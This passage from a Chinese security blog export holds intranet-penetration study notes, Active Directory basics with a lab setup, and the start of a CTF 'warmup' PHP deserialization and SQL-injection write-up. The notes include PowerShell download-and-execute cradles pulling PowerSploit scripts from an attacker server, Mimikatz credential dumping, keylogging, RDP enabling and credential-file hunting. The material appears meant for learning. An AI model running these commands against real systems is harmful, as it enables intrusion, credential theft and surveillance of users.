2012中开启3389端口\n\nwmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n3.35 端口扫描\n1. telnet端口连接\n没有开启的话去“打开或关闭windows功能”开启\n\ntelnet只用于确认端口是否开启用，不拿来端口扫描\n\ntelnet &lt;主机&gt; &lt;端口&gt;telnet 192.168.52.138 445\n2. PowerSploit 中的Invoke-portscan.ps1脚本\n下载地址：https://github.com/PowerShellMafia/PowerSploit\n端口扫描利用到工具包中的Portscan.ps1\npowershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;https://github.com/powersploit/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.17.1/24 -T 4 -ports &#x27;445,1433,8080,80,3389&#x27;&quot;// 或者扫描全部的端口：-Ports &quot;1-65535&quot;\n\n3. Nishang中的Invoke-portscan.ps1\n下载地址：https://github.com/samratashok/nishang\n该脚本可用于发现主机、解析主机名、扫描端口。\npowershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port &#x27;1-65535&#x27;&quot;// -ResolveHost：解析主机名\n\n4. Nmap扫描\n一般通过挂代理，nmap远程扫描\n《内网渗透测试：隐藏通讯隧道技术》\n5. Metasploit 端口扫描模块\nMetasploit中提供了很多内置的扫描模块，使用方便，在侵入内网后设置好路由直接扫即可，有时速度有些慢。几个常用的：\nauxiliary/scanner/portscan/tcpauxiliary/scanner/portscan/tcpauxiliary/scanner/portscan/ack  \n6. 收集域内端口的banner信息\nbanner信息表示“欢迎语”，其中会包含一些敏感信息，在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等，而版本号信息有时会存在公开的CVE可以利用。获取到版本号后，可以在中查找到对应的CVE编号，并在ExploitDB等平台上面找到相关的利用方式。\n获取Banner\n扫描到端口后就要获取到其Banner信息，接着就可以在漏洞库里查找poc，这个可以找一下常见的端口的服务来得知\n\n\n\n端口号\n端口说明\n攻击技巧\n\n\n\n\n21/22/69\nftp/tftp：文件传输协议\n允许匿名上传、下载、爆破、嗅探、溢出和后门\n\n\n22\nssh：远程连接\n爆破OpenSSH；28个退格\n\n\n23\ntelnet：远程连接\n爆破\\嗅探、弱口令\n\n\n25\nsmtp：邮件服务\n邮件伪造\n\n\n53\nDNS：域名系统\nDNS区域传输\\DNS劫持\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙\n\n\n67/68\ndhcp\n劫持\\欺骗\n\n\n80/443/8080\n常见web服务端口\nweb攻击、爆破、对应服务器版本漏洞\n\n\n110\npop3\n爆破、嗅探\n\n\n139\nsamba\n爆破\\未授权访问\\远程代码执行\n\n\n143\nimap\n爆破\n\n\n161\nsnmp\n爆破\n\n\n389\nldap目录访问协议\n注入攻击\\未授权访问，弱口令\n\n\n512/513/514\nlinux rexec\n直接使用rlogin\\爆破\n\n\n873\nrsync\n未授权访问\\文件上传\n\n\n1080\nsocket\n爆破：进行内网渗透\n\n\n1352\nlotus Domino邮件服务\n爆破：弱口令\\信息泄漏：源代码\n\n\n1433\nmssql\n爆破：使用系统用户登录\\注入攻击\\SA弱口令\n\n\n1521\noracle\n爆破：TNS\\注入攻击\\反弹shell\n\n\n2049\nnfs\n配置不当\n\n\n2181\nzookeeper\n未授权访问\n\n\n3306\nmysql\n爆破\\拒绝服务\\注入\\提权\n\n\n3389\nrdp\n爆破\\Shift后门\n\n\n3690\nSVN服务\nSVN泄露\\未授权访问\n\n\n4848\nglassfish\n爆破：控制台弱口令\\认证绕过\n\n\n5000\nsybase/DB2\n爆破\\注入\n\n\n5432\npostgresql\n缓冲区溢出\\注入攻击\\爆破：弱口令\n\n\n5632\npcanywhere\n拒绝服务\\代码执行，抓取密码\n\n\n5900\nvnc\n爆破：弱口令\\认证绕过\n\n\n6379\nredis\n未授权访问\\爆破：弱口令\n\n\n7001/7002\nweblogic\nJava反序列化\\控制台弱口令\\控制台部署webshell\n\n\n8069\nzabbix\n远程命令执行\\SQL注入\n\n\n8080/8089\nJBoss/Resin/Jetty/Jenkins\n反序列化、控制台弱口令\n\n\n9090\nwebsphere控制台\n爆破：控制台弱口令\\Java反序列\n\n\n9200/9300\nelasticsearch\n远程代码执行\n\n\n10000\nwebmin控制面板\n弱口令\n\n\n11211\nmemcacache\n未授权访问\n\n\n27017/27018\nmongodb\n爆破\\未授权访问\n\n\n50000\nSAP Management Console\n远程执行\n\n\n\n7. 使用Nmap获取banner\nnmap &lt;IP地址&gt; --script=banner -p &lt;端口/端口范围&gt;\n\n我这里没banner，就借用图片了\n8. 使用nc获取banner\nnc -nv &lt;IP地址&gt; &lt;端口&gt;\n\n3.36 存活主机扫描\nnbtscan\nnbtscan.exe是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。\n下载地址：https://github.com/MrAnonymous-1/nbtscan\n将nbtscan.exe上传到目标主机上，然后直接输入ip段即可运行扫描：\n//扫描一个网段nbtscan-1.0.35.exe 192.168.17.0/24//扫描两个网段nbtscan.exe 192.168.1.0/24 192.168.2.0/24\n\n\n参数解释：\n\nSHARING：该主机存在正在运行的文件和打印共享服务\nDC：该机器可能是域控制器\n?：没有识别处该机器的NetBIOS资源\n\nping\n基于icmp扫描内网\nfor /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.17.%I | findstr &quot;TTL=&quot;//兼容win7for /l %i in (1,1,254) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i &quot;Ping&quot;//扫b段for /l %i in (1,1,254) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Ping&quot;\n\narp-scan.exe\n基于arp协议来进行存活性扫描\n项目地址：https://github.com/QbsuranAlang/arp-scan-windows-\n\n这个工具的速度比上一个快很多\n批处理脚本\n这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统。\n@echo off@echo.@FOR /F &quot;usebackq delims=, &quot; %%J IN (`net view /domain ^|find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v ^|find &quot;命令成功完成&quot; /v ^|find &quot;--&quot; /v ^|find &quot;Domain&quot; /v ^|find &quot;&quot; /v ^|find &quot;コマンドは正常に終了しました&quot; /v /i`) do (@echo ====== Domain:%%J =========@FOR /F &quot;usebackq eol=; delims=, &quot; %%i in (`net view /domain:%%J ^|findstr &quot;\\\\&quot;`) do (@FOR /F &quot;usebackq eol=; tokens=1,2,3* delims=\\\\&quot; %%a in (`@echo %%i`) do (ping %%a -4 -n 1 -w 100 |find /i &quot;ping&quot; &gt; %%a.txt@FOR /F &quot;tokens=2 delims=[]&quot; %%b in (%%a.txt) do @echo \\\\%%a = [%%b]@del /f /q %%a.txt)))@echo ====== Getting IP Complete ======\nmsf主机存活扫描\nauxiliary/scanner/discovery/udp_sweepauxiliary/scanner/discovery/udp_probeauxiliary/scanner/netbios/nbname\nMSF建立会话拿到shell，即可直接执行DOS命令至今进行信息收集。也可以进行直接执行run winenum可以一键收集记录。\nrun winenum\n3.37 定位域管理员\npsloggeddon.exe\n下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon\npsloggedon.exe可以查看本地登陆的用户和通过本地计算机或远程计算机资源登陆的用户。如果指定的是用户名而不是机器名，psloggedon.exe会搜索网上邻居中的所有计算机，并显示该用户是否已经登录。该工具的某些功能需要管理员权限。\npsloggedon.exe [-] [-l] [-x] [\\\\computername或username]\n查看DC(域控)登录过的机器\nPsLoggedon64.exe -accepteula \\\\DC\n\n查看本地登录的用户\nPsLoggedon64.exe -accepteula\n\n查看指定用户登录的计算机\nPsLoggedon64.exe -accepteula Administrator\n\nPVEFindADUser.exe\n下载地址：https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/\nPVEFindADUser.exe 可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户。通过RDP远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置**.NET Framework 2.0 环境**，并需要有管理员权限。\nPVEFindADUser.exe &lt;参数&gt;\n我们一般直接运行PVEFindADUser.exe -current命令，即可显示域中所有计算机上当前登陆的所有用户。\n\n显示指定用户登录的计算机\n\n\n\ncurrent[“username”]\n如果仅指定了-current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名(Domain\\Username)，则显示该用户登陆的计算机\n\n\n\n\n\n\n\n\n\nPVEFindADUser.exe -current redteam.org\\dc//PVEFindADUser.exe -current domain\\username\n\npowerview.ps1\npowerview脚本可以用来获取当前域管理员在线登录的服务器，其依赖powershell和wmi，在powersploit工具包中，是一个收集域信息很好用的脚本。\n\nInvoke-UserHunter：**搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。**它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。\n\n如下，可以看到本地域有一个域管理员：\nnet group &quot;domain controllers&quot; /domain\n\n我们通过Invoke-UserHunter（等于Invoke-UserHunter -CheckAccess)来定位他们：\npowershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1&#x27;);Invoke-UserHunter\n\n详情请执行Get-Help Invoke-UserHunter命令查看，具体使用方法与前两个相似，它可以找到域内特定的用户群，接受用户名、用户列表和域组列表查询，接受一个主机列表或查询可用的主机域名。一切都是灵活的，让你自己定义找寻谁，在哪里找。\n获取指定用户在线机器：\n\n3.38 Empire信息收集\n# 查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等usemodule situation_awareness/host/winenum# 目标主机事件日志、应用程序控制策略日志、RDP登录信息、PowerShell脚本运行和保存的信息等，需要管理员权限usemodule situational_awareness/host/computerdetails\n3.39 powersploit 信息收集\n项目地址：https://github.com/PowerShellMafia/PowerSploit\n，已经停止维护\n建立会话后的meterpreter：\n#加载模块load powershell#调用本地ps脚本powershell_import /usr/share/windows-resources/powersploit/Recon/xx.ps1#命令执行powershell_execute  Get-NetDomain #获取当前的域名称Get-NetDomain  #返回所有域内成员的详细信息Get-Netuser #获取所有的域内的控制器信息Get-NetDomainController #获取所有域内机器的名称Get-NetComputer  #获取域内的所有的网络共享Get-Netshare#获取指定服务的远程连接信息  Get-NetRDPSESSION  #获取进程的详细信息Get-NetProcess  # 获取活动目录的信息Get-ADOPJECT #判断用户是否登陆计算机且用户是否有管理员权限invoke-processhunter\npowersploit无文件攻击\n将下载的文件放在vps上面。确保目标服务器可以访问：\n如：http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1\n#在目标机导入脚本：iex(new-object net.webclient).downloadstring(&quot;http://192.168.1.4/PowerSploit/Recon/Invoke-Portscan.ps1&quot;)#扫描网段、端口invoke-portscan -hosts 192.168.1.1/24 -ports &quot;21,22,80,139,80,445&quot;#invoke-mimikatz抓取hashiex(new-object net.webclient).downloadstring(&quot;http://192.168.1.4/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&quot;)#导hashInvoke-Mimikatz -dumpcreds#get-keystrokes键盘记录iex(new-object net.webclient).downloadstring(&quot;http://192.168.1.4/PowerSploit/Exfiltration/Get-Keystrokes.ps1&quot;)#将键盘记录保存到123.txt里面Get-Keystrokes -logpath C:\\Users\\admin\\123.txt\n3.40 翻翻配置文件\n一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件：\nfindstr  /s /m &quot;password&quot; *.*findstr /s /i /m /r &quot;defineclass remoteserver&quot; Web目录 \\*.jsp# /r 表示正则，/s表示遍历子目录，/m表示不显示匹配\nLinux查文件：\nfind Web应用目录 -iname &quot;*.jsp*&quot; | xargs egrep -l -i &quot;classloader&quot; |xargs egrep -l -i &quot;cipher&quot;find Web应用目录 -iname &quot;*.php*&quot; | xargs egrep -l -i &quot;openssl_decrypt&quot; |xargs egrep -l -i &quot;file_get_contents&quot;\n敏感路径\n%WINDIR%%WINDIR%\\system32\\%TEMP%%LOCALAPPDATA%%APPDATA%C:\\TEMP\\C:\\Windows\\Temp%UserProfile%\\Downloads%UserProfile%\\RecentC:\\$Recycle.bin\n常用应用的默认配置路径：\nTomcat:CATALINA_HOME/conf/tomcat-users.xmlApache:/etc/httpd/conf/httpd.confNginx:/etc/nginx/nginx.confWdcp:/www/wdlinux/wdcp/conf/mrpw.confMysql:mysql\\data\\mysql\\user.MYD\n还有一些Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)的密码查看\n项目: https://github.com/uknowsec/SharpDecryptPwd\n3.41 BloodHound域分析工具\nBloodHound通过图与线的形式，将域内用户、计算机、及相关用户等等之间的关系直观地展现在Red Team队员面前，帮助更快的梳理域内的情况。(这里先做了解)\n\nBloodHound基于Neo4j(非关系型数据库)\n\n配置\n\n\n安装java\n\n\n安装Neo4jServer Community\nhttps://neo4j.com/download-center/#community\n\n\n\n开启服务\nneo4j.bat console\n这里发现有点问题，就先放弃了。留个标记等日后需要拾起-  . -\n域分析工具BloodHound使用教程 \n3.42 使用empire收集信息\n在攻击机上安装empire后，使用usemodule powershell/situational_awareness/host/winenum即可收集相关信息，注意使用该模块需要拿到管理员权限\n四、参考文章：\n内网渗透-信息收集篇\n内网渗透初识—信息收集1\n内网渗透初识—信息收集2\n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"内网渗透学习-基础知识","url":"/2023/09/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87/","content":"内网也指局域网，是指在某一区域由多台计算机互连而成的计算机组。\n一、内网基础知识\n0x01 工作组\n对局域网中的计算机进行分类，使得网络更有序。计算机的管理依然是各自为政，所有计算机依然是对等的，松散会员制，可以随意加入和退出，且不同工作组之间的共享资源可以相互访问。\n0x02 域\n分类：单域、子域、父域、域树、域森林、DNS域名服务器\n“域”是一个有安全边界的计算机组合（一个域中的用户无法访问另一个域中的资源），域内资源由一台域控制器（Domain Controller，DC）集中管理，用户名和密码是放在域控制器去验证的。\n优点：通过组策略来统一管理。\n单域：即只有一个域的网络环境，一般需要两台DC，一台DC，另一台备用DC（容灾）\n父子域：类比公司总部和公司分部的关系，总部的域称为父域，各分部的域称为该域的子域。使用父子域的好处：\n\n减小了域之间信息交互的压力（域内信息交互不会压缩，域间信息交互可压缩）\n不同的子域可以指定特定的安全策略\n\n父子域中域名使用一个.表示一个层次，类似于DNS域名表示方式，子域只能使用父域的名字作为域名后缀\n域树：多个域通过建立信任关系组成的集合。若两个域之间需要相互访问，需要建立信任关系（Trust Relation），通过信任关系可以将父子域连接成树状结构\n\n域森林：多个域树通过建立信任关系组成的集合。\n\nDNS域名服务器：实现域名到IP地址的转换。由于域中计算机使用DNS来定位DC、服务器和其他计算机，所以域的名字就是DNS域的名字。\n内网渗透中，大都是通过寻找DNS服务器来确定域控制器位置（因为DNS服务器和域控制器通常配置在一台机器上）\n0x03 活动目录\n活动目录（Active Directory，AD）是指域环境中提供目录服务的组件，用于存储有关网络对象（用户、组、计算机、共享资源、联系人）的信息。基于活动目录有目录服务，用于帮助用户从活动目录中快速找到所需的消息。活动目录使得企业可以对网络环境进行集中管理。（可类比为内网中的索引，里面存储有内网里所有资源的快捷方式）\n活动目录的逻辑结构包含组织单元、域、域树、域森林。域树内的所有域共享一个活动目录，因此非常适合进行统一管理。\n活动目录的功能：\n\n账号集中管理\n软件集中管理\n环境集中管理\n增强安全性\n更可靠、更短的宕机时间\n\n**域和活动目录的区别：**要实现域环境，其实就是要安装AD。一台计算机安装了AD之后就变成了DC。\n下面解释一下AD与DC的区别\n0x04 AD与DC的区别\n如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。\n那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。\n那么有了域环境的话，回答最初的问题：在域环境中，只需要在活动目录中创建一次Alan账户，那么就可以在任意200台电脑中的一台上登录Alan，如果要为Alan账户更改密码，只需要在活动目录中更改一次就可以了。\n0x05 安全域的划分\n5.1 内网\n安全级别最高\n分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和办公区（员工日常工作区，一般能够访问DMZ，部分主机可以访问核心区）\n5.2 DMZ（Demilitarized Zone）\n边界网络，隔离区，安全级别中等\n作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施\n5.3 外网\nInternet，安全级别最低\n拥有DMZ的网络需要制定一些访问控制策略：\n\n1.内网可以访问外网\n2.内网可以访问DMZ\n3.外网不能访问内网\n4.外网可以访问DMZ\n5.DMZ不能访问内网\n6.DMZ不能访问外网\n\n\n0x06 域中计算机的分类\n域控制器、成员服务器、客户机、独立服务器\n\n域控制器：用于管理所有的网络访问，存储域内所有的账户和策略信息。允许网络中拥有多台域控制器（容灾）\n成员服务器：安装了服务器操作系统并加入了域，但没有安装活动目录的计算机，主要任务是提供网络资源\n客户机：安装了其他操作系统的计算机，利用这些计算机和域中的账户就可以登录到域。\n独立服务器：和域无关，既不加入域，也没有活动目录\n\n域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。\n域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。\n同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。\n0x07 域内权限\n组：\t组（Group）是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。管理员通过给相对的安全组访问权限就可以了，这样所有加入到安全组的用户帐号都将有同样的权限。使用安全组而不是单个的用户帐号可以方便，简化网络的维护和管理工作。域本地组：\t多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。全局组：\t单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域森林中的任何域中指派权限，全局组可以嵌套在其他组中。通用组：\t通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。\n可以简单这样记忆：\n\n域本地组：来自全林用于本域\n全局组：来自本域用于全林\n通用组：来自全林用于全林\n\n0x07 A-G-DL-P策略：\nA：用户账户\nG：全局组\nDL：域本地组\nP：许可，资源权限\n先将用户账号添加至全局组中，再将全局组添加至域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。\n在AGDLP形成以后,当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。\n\n0x08 域内权限解读\n8.1 域本地组\n来自全林作用于本域\n\nAdministrators（管理员组） ————最重要的权限\nRemote Desktop Users(远程登录组)\nPrint Operators（打印机操作员组）\nAccount Operators（帐号操作员组）\nServer Operaters（服务器操作员组）\nBackup Operators（备份操作员组）\n\n8.2 全局组\n来自本域作用于全林\n8.3 通用组\n来自全林作用于全林\n8.4 全局组、通用组的权限\nDomain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个\nEnterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限\nSchema Admins（架构管理员组）————最重要的权限\nDomain Users（域用户组)\n\n1.通常DNS服务器与域控制器会在同一台机器上\n2.一个域内至少需要两台DC，需要一台用作备份\n\n二、常用工具分类\n0x01 主机平台及常用工具总结\n\nWCE（Windows凭据管理器）\nminikatz（从内存中获取明文密码）\nResponder（嗅探网络中所有的LLMNR包，获取主机的信息）\nBeEF（一款针对浏览器的渗透测试工具）\nDSHashes（从NTDSXtract中提取用户易于理解的散列值）\nPowerSploit（一款基于PowerShell的后渗透测试框架）\nNishang（一款针对Powershell的渗透测试工具）\nEmpire（一款内网渗透测试利器）\nps_encoder.py（使用Base64编码封装的Powershell命令包）\nsmbexec（一个使用samba工具的快速psExec工具）\n后门制造工厂（对PE、ELF等二进制注入Shellcode）\nVeil（用于生成绕过常见杀软的Metasploit有效载荷）\nMetasploit（计算机安全漏洞项目框架）\nCobalt Strike（一款优秀的后渗透测试平台）\n\n0x02 Windows渗透常用工具\n\nNmap（一款免费的网络发现和安全审计工具）\nWireshark（一款免费且开源的网络协议和数据包解析器）\nPuTTY（一款免费且开源的SSH和Telnet客户端）\nSQLMap（一款免费且开源的SQL注入工具）\nBurpSuite（一款针对Web应用程序进行安全测试的代理工具）\nHydra（一个网络登录暴力破解工具）\nGetif（一款收集SNMP设备信息的工具）\nCain&amp;Abel（一个密码恢复工具，集成嗅探等多种功能）\nPowerSploit（一款基于PowerShell的后渗透测试框架）\nNishang（一款针对Powershell的渗透测试工具）\n\n0x03 PowerShell基本命令\n3.1 查看Powershell版本\nGet-Host$PSVersionTable.PSVERSION\n\n3.2 Powershell 常用命令\nNew-Item hack -ItemType Directory #新建目录New-Item ailx0000.txt -ItemType File #新建文件Set-Content .\\ailx0000.txt -Value &quot;hi hacker ailx10...&quot; #写文件Add-Content .\\ailx0000.txt -Value &quot;ooops~&quot; #追加内容Get-Content .\\ailx0000.txt #显示内容Clear-Content .\\ailx0000.txt #清楚内容Remove-Item .\\ailx0000.txt #删除文件\n3.3 常见用途\n1、绕过本地权限并执行2、从网站服务器中下载脚本，绕过本地权限并偷偷执行3、使用Base64对PowerShell命令进行编码\n三、内网环境搭建\n实验：搭建内网环境\n1.搭建域环境\n实验环境\n工具： vmvare、winserver2012、winserver2008、win7镜像\n下载地址：MSDN\n1、winserver2012 R2搭建\n1.首先配置win12的ip地址。我们可以先ipconfig查看其地址和默认网关等，然后配置成其静态IP等。\n这里应该是192.168.17.129（照片错误）\n\n\n2.在控制面板-系统和安全-系统-高级系统设置、域和工作组-计算机名–更改–计算机名\n\n3.安装域控制器和dns服务。\n选择服务器管理器，选择添加角色和功能向导，在服务器角色 选择DNS服务器\n在服务器角色窗口选择Active Directory域服务和DNS服务器\n\n一路默认设置到确认页面\n\n勾选自动重新启动服务器，然后安装。\n4.升级服务器\n安装完毕后。点击将此服务器提升为域控制器\n\n在Active Directory域服务配置向导界面，在部署配置部分单击选中”添加新林”，然后输入根域名”hacke.testlab”(必须使用符合DNS命名约定的根域名)。\n\n在域控制器选项部分，将林功能级别，域功能级别都设置成”Windows Server 2012 R2”。创建域林时，在默认情况下应选择DNS服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC）。然后，设置目录服务还原模式的密码（在开机进入安全模式修复活动目录数据库时使用此密码）\n然后到DNS选项，会出现关于DNS的警告。不用理会警告，保持默认设置。\n然后一路都是默认配置\n安装完成后重启\n\n5.创建Active Directory 用户\n为win2008和win7用户创建域控制器账户。\n在”Active Directory”用户和计算机界面中选择”Users”目录并单击右键，使用弹出的快捷菜单添加用户。\n\n创建testuser账户\n\n\n2、Win2008 R2服务器\n1.配置IP\nWindows Server 2008 R2 的IP地址和DNS服务器地址如下：\n\n\n测试一下，ping hacker.testlab\n\n2.加入域\n输入域的名称，点击”确定”，随后会让输入设置的用户名和密码：\n\n重启计算机，登陆\n输入net view /domain:hacker查看域用户，(每台域内机器均可查看)\n\n搭建了一个简单的域环境\n注：如果出现6118的问题，百度就可以解决，一般就是防火墙和Computer Browser未开启的问题\n参考：net view 时报错 发生系统错误 6118 解决\n3、Win7服务器\n1.先更改ip地址，然后设置dns地，然后ping一下试试。\n\n\n2.ping通，说明前半部分搭建成功。\n\n3.更改计算机名，更改为win7-X64-test，将域名更改为hacker.testlab\n\n4.然后输入域管理员的账号和密码后，立即重启。\n这里在win7使用net user /domain命令时，总是报错：发生系统错误5，百度了很多，有的说是权限问题，但我即使以管理员身份也不行。最后看了N多篇搭建文章，也没啥成果，但是看了一篇文章说，重启后我们以域管理员的身份登录win7即可\n\n如上图成功了，这里我也不清楚是否不以域管理员登录也能执行命令，但我感觉应该是搭建过程中少了点什么，这里也没深究。\n不过似乎要实际加入域环境中需要用域账号登录，或许这里我存在着理解错误\n到此搭建了一个最简单的内网环境，以后有需要在接着搭建，现在就先学习了解一下，为实战做准备。\n四、参考文章\n内网渗透]内网基础知识 \n内网渗透之基础知识\n内网渗透基石篇：内网基础知识及域环境搭建\n内网渗透环境搭建\n内网渗透-环境搭建\n域渗透笔记-域环境搭建\n顺便记录一个激活系统的软件地址：神龙KMS来激活的系统，很方便\nhttp://www.yishimei.cn/network/319.html\n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"攻防世界-warmup","url":"/2023/09/06/%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-warmup/","content":"题目描述：\n平平无奇的输入框\n题目解题：\n\n先尝试了几下弱口令，没用，那看一下题目给的附件，发现是源码，那开始审计（这里取关键部分）\nconn.php\n&lt;?phpinclude &#x27;flag.php&#x27;; class SQL &#123;    public $table = &#x27;&#x27;;    public $username = &#x27;&#x27;;    public $password = &#x27;&#x27;;    public $conn;    public function __construct() &#123;    &#125;        public function connect() &#123;\t\t//与数据库连接        $this-&gt;conn = new mysqli(&quot;localhost&quot;, &quot;xxxxx&quot;, &quot;xxxx&quot;, &quot;xxxx&quot;);    &#125;    public function check_login()&#123;        $result = $this-&gt;query();        if ($result === false) &#123;//进行数据库的查询            die(&quot;database error, please check your input&quot;);        &#125;        $row = $result-&gt;fetch_assoc();//从结果中取得一行作为关联数组        if($row === NULL)&#123;            die(&quot;username or password incorrect!&quot;);        &#125;else if($row[&#x27;username&#x27;] === &#x27;admin&#x27;)&#123;//若username=admin则输出flag            $flag = file_get_contents(&#x27;flag.php&#x27;);            echo &quot;welcome, admin! this is your flag -&gt; &quot;.$flag;        &#125;else&#123;            echo &quot;welcome! but you are not admin&quot;;        &#125;        $result-&gt;free();    &#125;    public function query() &#123;        $this-&gt;waf();//参数的过滤        return $this-&gt;conn-&gt;query (&quot;select username,password from &quot;.$this-&gt;table.&quot; where username=&#x27;&quot;.$this-&gt;username.&quot;&#x27; and password=&#x27;&quot;.$this-&gt;password.&quot;&#x27;&quot;);    &#125;    public function waf()&#123;    \t$blacklist = [&quot;union&quot;, &quot;join&quot;, &quot;!&quot;, &quot;\\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;.&quot;, &quot;/&quot;, &quot;:&quot;, &quot;;&quot;, &quot;^&quot;, &quot;_&quot;, &quot;`&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;@&quot;, &quot;[&quot;, &quot;\\\\&quot;, &quot;]&quot; , &quot;*&quot;, &quot;+&quot;, &quot;-&quot;];//设置黑名单    \tforeach ($blacklist as $value) &#123;    \t\tif(strripos($this-&gt;table, $value))&#123;    \t\t\tdie(&#x27;bad hacker,go out!&#x27;);    \t\t&#125;    \t&#125;        foreach ($blacklist as $value) &#123;            if(strripos($this-&gt;username, $value))&#123;                die(&#x27;bad hacker,go out!&#x27;);            &#125;        &#125;        foreach ($blacklist as $value) &#123;//以上都是foreach循环，分别检测table，用户名和密码是否有敏感字符            if(strripos($this-&gt;password, $value))&#123;                die(&#x27;bad hacker,go out!&#x27;);            &#125;        &#125;    &#125;    public function __wakeup()&#123;//反序列化自动调用        if (!isset ($this-&gt;conn)) &#123;            $this-&gt;connect ();//连接数据库        &#125;        if($this-&gt;table)&#123;            $this-&gt;waf();        &#125;        $this-&gt;check_login();        $this-&gt;conn-&gt;close();    &#125;&#125;?&gt;\nindex.php\n&lt;?phpinclude &#x27;conn.php&#x27;;include &#x27;flag.php&#x27;;if (isset ($_COOKIE[&#x27;last_login_info&#x27;])) &#123;    $last_login_info = unserialize (base64_decode ($_COOKIE[&#x27;last_login_info&#x27;]));//传入一个base加密的cookie参数    try &#123;\t//检测传入的参数是否是数组\t\t\t\t\t\t\t\t//正在浏览当前页面用户的 IP 地址。         if (is_array($last_login_info) &amp;&amp; $last_login_info[&#x27;ip&#x27;] != $_SERVER[&#x27;REMOTE_ADDR&#x27;]) &#123;            die(&#x27;WAF info: your ip status has been changed, you are dangrous.&#x27;);        &#125;    &#125; catch(Exception $e) &#123;        die(&#x27;Error&#x27;);    &#125;&#125; else &#123;    $cookie = base64_encode (serialize (array ( &#x27;ip&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;]))) ;    setcookie (&#x27;last_login_info&#x27;, $cookie, time () + (86400 * 30));&#125;if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;\t$table = &#x27;users&#x27;;\t$username = addslashes($_POST[&#x27;username&#x27;]);\t$password = addslashes($_POST[&#x27;password&#x27;]);\t$sql = new 